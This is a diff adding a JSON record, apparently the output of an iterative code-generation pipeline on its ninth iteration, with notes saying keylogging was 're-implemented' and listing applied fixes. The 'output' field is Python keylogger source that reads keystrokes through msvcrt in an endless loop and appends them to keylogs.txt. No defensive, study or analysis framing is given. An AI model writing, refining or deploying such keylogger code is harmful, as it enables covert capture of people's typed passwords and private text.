@@ -1,0 +1,9 @@
+{
+  "output": "import msvcrt\ndef on_press():\n    try:\n        while True:\n            if msvcrt.kbhit():\n                key = msvcrt.getch()\n                k = key.decode('utf-8')\n                if k == '\\r':\n                    k = '[ENTER]'\n                elif k == '\\x08':\n                    k = '[BACKSPACE]'\n                elif k == ' ': \n                    k = ' '\n                else:\n                    k = f'[{k.upper()}]' if ord(k) < 32 or ord(k) > 126 else k\n                with open('keylogs.txt', 'a') as log_file:\n                    log_file.write(k)\n                print(f'Key pressed: {k}')\n    except Exception as e:\n        print(f'Error writing to file: {e}')\non_press()",
+  "notes": "Re-implemented keylogging using the standard msvcrt library and improved special key handling.",
+  "applied_fixes": [
+    "iteration8_issue1",
+    "iteration8_issue2"
+  ],
+  "iterations": 9
+}
